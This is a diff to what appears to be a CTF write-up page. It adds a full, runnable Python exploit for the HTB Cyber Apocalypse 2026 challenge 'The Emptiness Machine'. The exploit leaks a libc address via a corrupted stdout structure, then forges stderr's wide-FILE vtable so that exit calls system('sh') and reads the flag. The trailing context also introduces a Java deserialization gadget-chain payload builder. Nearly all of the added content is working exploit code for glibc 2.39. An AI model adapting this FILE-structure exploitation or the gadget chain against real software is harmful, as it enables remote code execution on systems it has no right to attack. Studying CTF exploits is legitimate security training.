@@ -156,6 +156,223 @@
 
 <hr>
 
+<h2>the_emptiness_machine_exploit.py</h2>
+
+<p>The first corruption leaked a libc pointer through <code>stdout</code>. The second used <code>stderr</code> to reach <code>system()</code>.</p>
+
+<p>Source: <a href="/the-emptiness-machine.html">The Emptiness Machine</a>. Download: <a href="/scripts/the_emptiness_machine_exploit.py">the_emptiness_machine_exploit.py</a></p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Exploit for HTB Cyber Apocalypse 2026: The Emptiness Machine.&quot;&quot;&quot;
+
+from __future__ import annotations
+
+import argparse
+import re
+import socket
+import struct
+import sys
+import time
+
+
+PROMPT = b&quot;Rin&#x27;s interaction: &quot;
+WHITESPACE = b&quot; \t\n\r\v\f&quot;
+
+# Offsets in the supplied Ubuntu glibc 2.39.
+LEAK_TO_LIBC_BASE = 0x1BD4A0
+STDERR = 0x2044E0
+STDERR_LOCK = 0x205700
+SYSTEM = 0x58750
+WFILE_JUMPS = 0x202228
+
+
+def p64(value: int) -&gt; bytes:
+    return struct.pack(&quot;&lt;Q&quot;, value)
+
+
+def u64(data: bytes) -&gt; int:
+    return struct.unpack(&quot;&lt;Q&quot;, data)[0]
+
+
+def put64(payload: bytearray, offset: int, value: int) -&gt; None:
+    payload[offset : offset + 8] = p64(value)
+
+
+class Connection:
+    def __init__(self, host: str, port: int, timeout: float) -&gt; None:
+        self.sock = socket.create_connection((host, port), timeout=timeout)
+        self.sock.settimeout(timeout)
+        self.buffer = bytearray()
+
+    def close(self) -&gt; None:
+        self.sock.close()
+
+    def sendline(self, data: bytes) -&gt; None:
+        self.sock.sendall(data + b&quot;\n&quot;)
+
+    def recvuntil(self, marker: bytes, maximum: int = 2 * 1024 * 1024) -&gt; bytes:
+        while marker not in self.buffer:
+            chunk = self.sock.recv(65536)
+            if not chunk:
+                raise EOFError(f&quot;connection closed after {len(self.buffer)} bytes&quot;)
+            self.buffer.extend(chunk)
+            if len(self.buffer) &gt; maximum:
+                raise RuntimeError(f&quot;marker not found within {maximum} bytes&quot;)
+
+        end = self.buffer.index(marker) + len(marker)
+        result = bytes(self.buffer[:end])
+        del self.buffer[:end]
+        return result
+
+    def recvall(self, idle_timeout: float = 2.0) -&gt; bytes:
+        output = bytearray(self.buffer)
+        self.buffer.clear()
+        deadline = time.monotonic() + idle_timeout
+        while time.monotonic() &lt; deadline:
+            try:
+                chunk = self.sock.recv(65536)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            output.extend(chunk)
+            deadline = time.monotonic() + idle_timeout
+        return bytes(output)
+
+
+def build_stage1() -&gt; bytes:
+    return p64(0xFBAD1800) + p64(0) * 3 + b&quot;\x00&quot;
+
+
+def build_stage2(libc_base: int) -&gt; bytes:
+    stderr = libc_base + STDERR
+    payload = bytearray(224)
+
+    # stderr begins with the command passed to system().
+    payload[0:8] = b&quot;A=;sh\x00\x00\x00&quot;
+
+    # Mark stderr for flushing during exit.
+    put64(payload, 0x20, 0)  # _IO_write_base
+    put64(payload, 0x28, 1)  # _IO_write_ptr
+    put64(payload, 0x88, libc_base + STDERR_LOCK)
+
+    # Store the wide FILE layout inside stderr.
+    put64(payload, 0xA0, stderr - 0x10)  # _wide_data
+    struct.pack_into(&quot;&lt;i&quot;, payload, 0xC0, 0)  # _mode
+    put64(payload, 0xC8, libc_base + SYSTEM)
+    put64(payload, 0xD0, stderr + 0x60)  # fake wide vtable
+    put64(payload, 0xD8, libc_base + WFILE_JUMPS)  # validated outer vtable
+
+    return bytes(payload)
+
+
+def find_libc_base(disclosure: bytes) -&gt; tuple[int, int, int]:
+    &quot;&quot;&quot;Scan the disclosure for the libc pointer.&quot;&quot;&quot;
+
+    candidates = []
+    for offset in range(len(disclosure) - 7):
+        leaked_pointer = u64(disclosure[offset : offset + 8])
+        libc_base = leaked_pointer - LEAK_TO_LIBC_BASE
+
+        if not 0x700000000000 &lt;= leaked_pointer &lt; 0x800000000000:
+            continue
+        if libc_base &lt;= 0 or libc_base &amp; 0xFFF:
+            continue
+
+        candidates.append((offset, leaked_pointer, libc_base))
+
+    if not candidates:
+        raise ValueError(
+            f&quot;no page-aligned libc candidate in {len(disclosure)} leaked bytes&quot;
+        )
+
+    return candidates[0]
+
+
+def exploit_once(
+    host: str,
+    port: int,
+    timeout: float,
+    command: str,
+) -&gt; tuple[bytes | None, str]:
+    connection = Connection(host, port, timeout)
+    try:
+        connection.recvuntil(PROMPT)
+        connection.sendline(build_stage1())
+
+        disclosure = connection.recvuntil(PROMPT)
+        try:
+            leak_offset, leaked_pointer, libc_base = find_libc_base(disclosure)
+        except ValueError as exc:
+            return None, str(exc)
+
+        stage2 = build_stage2(libc_base)
+        bad = [(index, byte) for index, byte in enumerate(stage2) if byte in WHITESPACE]
+        if bad:
+            locations = &quot;, &quot;.join(f&quot;{index:#x}={byte:#x}&quot; for index, byte in bad)
+            return None, f&quot;ASLR produced scanf whitespace bytes: {locations}&quot;
+
+        print(f&quot;[+] libc leak: {leaked_pointer:#x}&quot;)
+        print(f&quot;[+] libc base: {libc_base:#x}&quot;)
+        print(f&quot;[+] leak offset: {leak_offset:#x}&quot;)
+        connection.sendline(stage2)
+        connection.sendline(command.encode())
+        return connection.recvall(), &quot;payload delivered&quot;
+    finally:
+        connection.close()
+
+
+def main() -&gt; int:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;host&quot;)
+    parser.add_argument(&quot;port&quot;, type=int)
+    parser.add_argument(
+        &quot;--command&quot;,
+        default=&quot;cat /flag.txt 2&gt;/dev/null; cat flag.txt 2&gt;/dev/null; exit&quot;,
+        help=&quot;command run by the spawned shell&quot;,
+    )
+    parser.add_argument(&quot;--attempts&quot;, type=int, default=20)
+    parser.add_argument(&quot;--timeout&quot;, type=float, default=4.0)
+    args = parser.parse_args()
+
+    for attempt in range(1, args.attempts + 1):
+        print(f&quot;[*] attempt {attempt}/{args.attempts}&quot;)
+        try:
+            output, status = exploit_once(
+                args.host,
+                args.port,
+                args.timeout,
+                args.command,
+            )
+        except (ConnectionError, EOFError, OSError, RuntimeError) as exc:
+            print(f&quot;[-] {exc}&quot;)
+            continue
+
+        if output is None:
+            print(f&quot;[-] retrying: {status}&quot;)
+            continue
+
+        sys.stdout.buffer.write(output)
+        if output and not output.endswith(b&quot;\n&quot;):
+            print()
+
+        match = re.search(rb&quot;HTB\{[^}\r\n]+\}&quot;, output)
+        if match:
+            print(f&quot;[+] flag: {match.group().decode()}&quot;)
+            return 0
+
+        print(&quot;[-] shell ran, but no HTB flag was found in its output&quot;)
+        return 1
+
+    print(&quot;[-] all attempts exhausted&quot;)
+    return 1
+
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())</code></pre>
+
+<hr>
+
 <h2>OathForger.java</h2>
 
 <p>Builds the serialized Java deserialization payload used in Signetry. Constructs a BadAttributeValueExpException wrapping a shaded Jackson POJONode around a TemplatesImpl gadget, removes BaseJsonNode.writeReplace() with Javassist, and writes the trigger to a binary file for inclusion in a DL4J model archive.</p>
